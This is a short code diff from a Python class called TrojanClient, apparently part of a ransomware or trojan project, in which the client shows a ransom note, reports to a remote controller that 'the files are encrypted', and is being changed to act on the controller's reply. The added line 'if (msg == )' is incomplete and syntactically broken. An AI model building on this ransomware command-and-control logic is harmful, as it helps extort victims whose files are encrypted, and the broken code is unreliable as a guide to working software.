@@ -143,7 +143,8 @@ class TrojanClient:
         RansomNote.display_encryption_note()
         protocol.send(self.connection, "the files are encrypted")
         
-        protocol.receive(self.connection)
+        msg = protocol.receive(self.connection)
+        if (msg == )
 
 
 
